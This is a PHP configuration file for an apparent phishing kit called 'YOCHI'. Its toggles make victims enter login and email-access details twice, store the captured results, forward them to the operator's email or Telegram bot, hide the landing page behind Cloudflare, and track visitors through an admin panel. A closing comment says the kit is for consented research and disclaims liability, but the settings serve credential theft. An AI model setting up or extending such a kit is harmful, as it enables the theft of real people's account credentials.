<?php
###########################################################################################################
# <------- YOCHI PAGE CONFIGURATION FILE <></>
/*
TOGGLE ON / OFF:
1 : ENABLE.
0 : DISABLE.
USE 1 OR 0 to SET FEATURES ON OR OFF*/

$usecaution=1;                     # <--- INDICATE WHETHER YOU WANT TO USE CAUTION OR NOT	
$cautioncontent='info';            # <--- card / deposit / update /info ..... content for caution page. 
$createfolderpersession=1;         # <--- CREATE A NEW FOLDER FOR EACH SESSION
$ftpsave=0;                        # <--- SAVE RESULTS ON PAGEHOMEFOLDER/rst/.....
$sendtoemail=0;                    # <--- SEND RESULTS TO EMAIL
$sendtotg=0;                       # <--- SEND RESULTS TO TELEGRAM
$doubleloginentry=1;               # <--- REQUEST TWICE FOR LOGIN DETAILS
$confirmemaillog=1;                # <--- REQUEST TWICE FOR EMAIL ACCESS DETAILS
$cloudflarelanding=1;              # <--- USE CLOUDFLARE FOR LANDING PAGE
$send = "youremail@domain.yes,";   # <--- YOUR EMAIL/EMAILS SEPARATED BY COMMAS
$tgbot = "Your BOT TOKEN";         # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
$chatid = "CHAT_ID";               # <--- YOUR TELEGRAM CHAT ID
$resultheading = "🎌 YOCHI 🎌";      # <--- WHAT YOUR RESULTS SHOULD DISPLAY AS TOP 
$adminpanel = 0;                   # <--- ENABLE ADMIN PANEL
$adminpass = "";                   # <--- YOUR PASSWORD TO VIEW ADMIN PANEL
// goto yourdomain.com/admin/index.php to track visiting activity
/*  ___      ___      _______  __
    \  \    /  /     /  _____||  |
     \  \  /  /	    /  /      |  |
      \  \/  /	   |  |	      |  |___    O
       \    /____  |  |       |   ___ \	 _
        |  |/_ _ \ |  |       |  |   \ || |
        |  | o_o  | \  \____  |  |   | || |
        |__|\____/   \______| |__|   | ||_|      grrrr
		If you experience any issues

	This work is intended to educate researchers on the possiblities of what proficient attackers can do and possible ways they do it. This kit should only be used in a legal social engineering research context with consent from the party to be phished.

	The use of this tool is the complete responsibility of the user. It is the end user's responsibility to obey all applicable laws when using this. Developer assumes no liability whatsoever and is not responsible for any misuse or damage caused by this kit.
									   */
?>